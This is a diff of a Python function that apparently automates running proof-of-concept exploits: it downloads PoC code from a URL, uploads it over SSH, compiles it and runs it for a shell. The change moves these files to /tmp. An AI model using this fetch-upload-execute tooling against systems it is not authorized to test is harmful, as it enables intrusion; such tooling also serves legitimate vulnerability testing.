@@ -188,14 +188,14 @@ def runpoc(ssh, url, lg, ext):
         f.write(rq.get(rurl).content)
 
     print("      📤 Uploading POC")
-    send(ssh, "script."+ext, "script."+ext)
+    send(ssh, "script."+ext, "/tmp/script."+ext)
 
     if (ext=="py"):
         cmd = next((c for c in avlc if c in lgs[lg]))
         #print(cmd+" /tmp/script.py")
         print("      Running Shell\n")
         sts = time.monotonic()
-        open_shell(ssh, cmd+" script.py; exit")
+        open_shell(ssh, cmd+" /tmp/script.py; exit")
         if (time.monotonic()-sts < success_time):
             return(False)
     elif (ext=="c"):
@@ -206,7 +206,7 @@ def runpoc(ssh, url, lg, ext):
         r=""
         rc=1
         for cmd in [c for c in avlc if c in lgs[lg]]:
-            [r, rc] = exec(ssh, cmd+" script.exe script.c")
+            [r, rc] = exec(ssh, cmd+" /tmp/script.exe /tmp/script.c")
             if rc==0:
                 break
 
@@ -227,10 +227,10 @@ def runpoc(ssh, url, lg, ext):
             if rc==0:
                 print("suceeded")
                 print("      📤 Uploading compiled POC")
-                send(ssh, "script.exe", "script.exe")
+                send(ssh, "script.exe", "/tmp/script.exe")
                 print("       Running Shell")
                 sts=time.monotonic()
-                open_shell(ssh, "./script.exe; exit")
+                open_shell(ssh, "/tmp/script.exe; exit")
                 if (time.monotonic()-sts < success_time):
                     return(False)
             else:
@@ -240,7 +240,7 @@ def runpoc(ssh, url, lg, ext):
             print("succeeded")
             print("      Running Shell\n")
             sts=time.monotonic()
-            open_shell(ssh, "./script.exe; exit")
+            open_shell(ssh, "/tmp/script.exe; exit")
             if (time.monotonic()-sts < success_time):
                 return(False)
     elif (ext=="go"):
